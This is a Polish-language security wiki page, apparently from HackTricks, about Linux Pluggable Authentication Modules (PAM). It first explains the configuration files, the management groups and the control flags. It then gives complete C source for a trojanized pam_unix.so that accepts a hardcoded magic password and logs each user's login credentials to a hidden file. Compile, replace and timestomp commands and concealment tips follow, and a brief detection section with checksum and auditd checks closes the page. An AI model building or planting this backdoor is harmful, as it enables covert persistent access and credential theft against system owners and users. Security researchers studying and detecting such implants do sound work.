# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** działa jako mechanizm zabezpieczeń, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych**, kontrolując ich dostęp na podstawie różnych kryteriów. Jest to podobne do cyfrowego strażnika, który zapewnia, że tylko autoryzowani użytkownicy mogą korzystać z określonych usług, jednocześnie potencjalnie ograniczając ich użycie, aby zapobiec przeciążeniu systemu.

#### Pliki konfiguracyjne

- **Systemy Solaris i UNIX** zazwyczaj wykorzystują centralny plik konfiguracyjny znajdujący się w `/etc/pam.conf`.
- **Systemy Linux** preferują podejście oparte na katalogach, przechowując konfiguracje specyficzne dla usług w `/etc/pam.d`. Na przykład, plik konfiguracyjny dla usługi logowania znajduje się w `/etc/pam.d/login`.

Przykład konfiguracji PAM dla usługi logowania może wyglądać następująco:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Zarządzanie obszarami PAM**

Te obszary, lub grupy zarządzania, obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za różne aspekty procesu uwierzytelniania i zarządzania sesjami:

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Obsługuje weryfikację konta, sprawdzając warunki takie jak przynależność do grupy lub ograniczenia czasowe.
- **Password**: Zarządza aktualizacjami haseł, w tym kontrolą złożoności lub zapobieganiem atakom słownikowym.
- **Session**: Zarządza działaniami podczas rozpoczęcia lub zakończenia sesji usługi, takimi jak montowanie katalogów lub ustawianie limitów zasobów.

#### **Kontrola modułów PAM**

Kontrole określają reakcję modułu na sukces lub porażkę, wpływając na ogólny proces uwierzytelniania. Obejmują one:

- **Required**: Porażka wymaganego modułu skutkuje ostateczną porażką, ale tylko po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe zakończenie procesu w przypadku porażki.
- **Sufficient**: Sukces omija pozostałe kontrole tego samego obszaru, chyba że kolejny moduł zawiedzie.
- **Optional**: Powoduje porażkę tylko wtedy, gdy jest jedynym modułem w stosie.

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami auth, proces przebiega w ścisłej kolejności. Jeśli moduł `pam_securetty` uzna terminal logowania za nieautoryzowany, logowania root są zablokowane, jednak wszystkie moduły są nadal przetwarzane z powodu jego statusu "required". Moduł `pam_env` ustawia zmienne środowiskowe, co może wspierać doświadczenia użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują, aby uwierzytelnić użytkownika, przy czym `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając efektywność i elastyczność metod uwierzytelniania.

## Backdooring PAM – Hooking `pam_unix.so`

Klasycznym trikiem na utrzymanie dostępu w środowiskach Linux o wysokiej wartości jest **zamiana legalnej biblioteki PAM na trojanizowany drop-in**. Ponieważ każde logowanie SSH / konsolowe kończy się wywołaniem `pam_unix.so:pam_sm_authenticate()`, kilka linii C wystarczy, aby przechwycić dane uwierzytelniające lub wdrożyć *magiczne* obejście hasła.

### Arkusz skrótów do kompilacji
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
Kompilacja i cicha wymiana:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – zapisz do pliku tymczasowego i `mv` do miejsca, aby uniknąć częściowo zapisanych bibliotek, które mogłyby zablokować SSH.
2. Umiejscowienie plików dziennika, takich jak `/usr/bin/.dbus.log`, łączy się z legalnymi artefaktami pulpitu.
3. Utrzymuj identyczne eksporty symboli (`pam_sm_setcred` itp.), aby uniknąć nieprawidłowego działania PAM.

### Detection
* Porównaj MD5/SHA256 `pam_unix.so` z pakietem dystrybucji.
* Sprawdź, czy istnieją pliki z uprawnieniami do zapisu dla wszystkich lub nietypowym właścicielem w `/lib/security/`.
* Reguła `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.

### References

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
